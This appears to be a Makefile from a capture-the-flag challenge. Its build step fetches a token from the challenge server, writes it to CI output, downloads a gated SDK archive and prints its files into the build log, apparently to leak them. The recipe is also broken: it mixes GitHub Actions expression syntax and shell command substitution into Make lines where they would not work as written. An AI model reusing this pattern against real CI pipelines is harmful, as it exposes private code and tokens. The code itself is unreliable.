all: coolencrypt

coolencrypt: coolsdk/cool.c program.c
	SITE_NAME=https://mycoolsdk-web.chal.irisc.tf
	MCSDK_TOKEN=$(curl ${SITE_NAME}/gettoken | head -n 1)
	echo "sdktok=${MCSDK_TOKEN}" >> $GITHUB_OUTPUT
	MCSDK_IDEN=$(curl "${SITE_NAME}/getiden?sdktok=${MCSDK_TOKEN}&repo=${GITHUB_REPOSITORY}&runid=${GITHUB_RUN_ID}" | head -n 1)
	echo ServerID-$MCSDK_IDEN
	sleep 5
	SITE_NAME=https://mycoolsdk-web.chal.irisc.tf
	MCSDK_TOKEN=${{needs.grab_sdk_info.outputs.sdktok}}
	MCSDK_SUCCESS=$(curl ${SITE_NAME}/checkiden?sdktok=${MCSDK_TOKEN} | head -n 1)
	echo $MCSDK_SUCCESS
	if [ "$MCSDK_SUCCESS" != "OK" ]; then
		exit
	fi
	curl ${SITE_NAME}/getsdk?sdktok=${MCSDK_TOKEN} -o sdk.tar.gz
	tar -xvzf sdk.tar.gz
	cat coolsdk/*
	$(CC) coolsdk/cool.c program.c -o coolencrypt
